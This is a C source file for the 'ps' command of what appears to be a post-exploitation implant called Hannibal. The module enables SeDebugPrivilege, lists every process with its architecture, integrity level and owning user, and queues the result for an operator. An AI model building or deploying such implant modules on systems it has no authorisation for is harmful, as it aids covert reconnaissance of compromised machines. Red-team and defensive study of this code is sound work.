#include "config.h"


#ifdef INCLUDE_CMD_PS

#include "hannibal_tasking.h"

/**
 * TODO: Refactor to reduce complexity and verbosity. Formatting ugly.
 */

SECTION_CODE void cmd_ps(TASK t)
{
    HANNIBAL_INSTANCE_PTR

    CMD_PS *ps = (CMD_PS *)t.cmd;


    size_t INITIAL_BUFFER_SIZE = 16384;
    size_t CURRENT_BUFFER_SIZE = INITIAL_BUFFER_SIZE;
    size_t CURRENT_BUFFER_USAGE = 0;

    UINT8 *response_content = (UINT8 *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, INITIAL_BUFFER_SIZE);

    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"ppid");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"pid");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"name");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"arch");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"integrity_level");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"user");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
    buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

    // // Get all processes
    HANDLE hSnapshot = hannibal_instance_ptr->Win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // Iterate through them
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (hannibal_instance_ptr->Win32.Process32FirstW(hSnapshot, &pe32)) {
        do {
            DWORD pid = pe32.th32ProcessID;
            DWORD ppid = pe32.th32ParentProcessID;
            WCHAR integrity_level[64] = {0};
            WCHAR arch[64] = {0};
            WCHAR user[256] = {0};
            WCHAR domain[256] = {0};
            WCHAR user_domain[512] = {0};
            // WCHAR name[256] = {0}; // pe32.szExeFile

            // Enable SeDebug
            HANDLE se_hToken;
            TOKEN_PRIVILEGES tp;

            if (!hannibal_instance_ptr->Win32.OpenProcessToken(-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &se_hToken)) {
            }

            hannibal_instance_ptr->Win32.LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid);
            tp.PrivilegeCount = 1; 
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (!hannibal_instance_ptr->Win32.AdjustTokenPrivileges(se_hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
            }

            hannibal_instance_ptr->Win32.CloseHandle(se_hToken);

            HANDLE hProcess;
            
            // Needed for integrity level
            hProcess = hannibal_instance_ptr->Win32.OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

            // Lower perms
            if(hProcess == NULL){
                hProcess = hannibal_instance_ptr->Win32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
                // DWORD dwError = GetLastError();
            }

            if(hProcess != NULL){

                // arch
                BOOL isWow64 = FALSE;
                if (hannibal_instance_ptr->Win32.IsWow64Process(hProcess, &isWow64)) {
                    if (isWow64) {
                        pic_memcpy(arch, L"x86", pic_strlenW(L"x86")*sizeof(WCHAR));
                    } else {
                        pic_memcpy(arch, L"x64", pic_strlenW(L"x64")*sizeof(WCHAR));
                    }
                } else {
                    pic_memcpy(arch, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                }

                // Integrity level, domain, user
                HANDLE hToken = NULL;
                if (hannibal_instance_ptr->Win32.OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {

                        DWORD dwLength = 0;
        
                        // Integrity level
                        
                        hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength);

                        if (dwLength > 0) {
                            
                            TOKEN_MANDATORY_LABEL* pLabel = (TOKEN_MANDATORY_LABEL *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, dwLength);
                            
                            if (pLabel != NULL) {
                            
                                if (hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenIntegrityLevel, pLabel, dwLength, &dwLength)) {
                                    DWORD integrity_value = *hannibal_instance_ptr->Win32.GetSidSubAuthority(pLabel->Label.Sid, 0);
                                    if (integrity_value == SECURITY_MANDATORY_LOW_RID) {
                                        pic_memcpy(integrity_level, L"Low", pic_strlenW(L"Low")*sizeof(WCHAR));
                                    } else if (integrity_value >= SECURITY_MANDATORY_MEDIUM_RID && integrity_value < SECURITY_MANDATORY_HIGH_RID) {
                                        pic_memcpy(integrity_level, L"Med", pic_strlenW(L"Med")*sizeof(WCHAR));
                                    } else if (integrity_value >= SECURITY_MANDATORY_HIGH_RID && integrity_value < SECURITY_MANDATORY_SYSTEM_RID) {
                                        pic_memcpy(integrity_level, L"High", pic_strlenW(L"High")*sizeof(WCHAR));
                                    } else if (integrity_value >= SECURITY_MANDATORY_SYSTEM_RID) {
                                        pic_memcpy(integrity_level, L"System", pic_strlenW(L"System")*sizeof(WCHAR));
                                    } else {
                                        pic_memcpy(integrity_level, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                                    }
                                } else {
                                    pic_memcpy(integrity_level, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                                }
                            
                                hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, pLabel);
                            } 
                        }

                        // domain, user
                        dwLength = 0;

                        if (!hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength) && hannibal_instance_ptr->Win32.GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
                            // DWORD dwError = GetLastError();
                        }

                        PTOKEN_USER pTokenUser = (PTOKEN_USER)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, dwLength);

                        if (hannibal_instance_ptr->Win32.GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength)) {

                            DWORD user_size = sizeof(user) * sizeof(wchar_t);
                            DWORD domain_size = sizeof(domain) * sizeof(wchar_t);
                            SID_NAME_USE sid_type;

                            if (hannibal_instance_ptr->Win32.LookupAccountSidW(NULL, pTokenUser->User.Sid, user, &user_size, domain, &domain_size, &sid_type)) {
                                pic_strcatW(user_domain, domain);
                                pic_strcatW(user_domain, L"\\\\");
                                pic_strcatW(user_domain, user);
                            } else {
                                pic_memcpy(user, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                                pic_memcpy(domain, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                                pic_memcpy(user_domain, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                            }
                        }
                        
                        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, pTokenUser);

                } else { // if OpenProcessToken fails
                    pic_memcpy(user, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                    pic_memcpy(domain, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                    pic_memcpy(integrity_level, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                    pic_memcpy(user_domain, L"-", pic_strlenW(L"-")*sizeof(WCHAR));

                }
            } else { // if hProcess != NULL
                pic_memcpy(user, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                pic_memcpy(domain, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                pic_memcpy(user_domain, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
                pic_memcpy(integrity_level, L"-", pic_strlenW(L"-")*sizeof(WCHAR));
            }

            size_t total_size = 0;

            WCHAR pidW[16] = {0};
            WCHAR ppidW[16] = {0};
            dword_to_wchar(pid, pidW, 10);
            dword_to_wchar(ppid, ppidW, 10);

            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, ppidW);
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, pidW);
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, pe32.szExeFile);
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, arch);
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, integrity_level);
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\t");
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, user_domain);
            buffer_append_alloc(&response_content, &CURRENT_BUFFER_SIZE, &CURRENT_BUFFER_USAGE, L"\n");

            hannibal_instance_ptr->Win32.CloseHandle(hProcess);

        } while (hannibal_instance_ptr->Win32.Process32NextW(hSnapshot, &pe32));

    } else { // if Process32FirstW
        hannibal_response(L"Error", t.task_uuid);
        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, response_content);
        hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, t.cmd);
        return;
    }

    hannibal_instance_ptr->Win32.CloseHandle(hSnapshot);


    TASK response_t;
    response_t.output = (LPCSTR)response_content;
    response_t.output_size = pic_strlenW((LPCWSTR)response_content)*sizeof(WCHAR) + 2;
    response_t.task_uuid = t.task_uuid;

    task_enqueue(hannibal_instance_ptr->tasks.tasks_response_queue, &response_t);

    hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->config.process_heap, 0, t.cmd);
    
}

#endif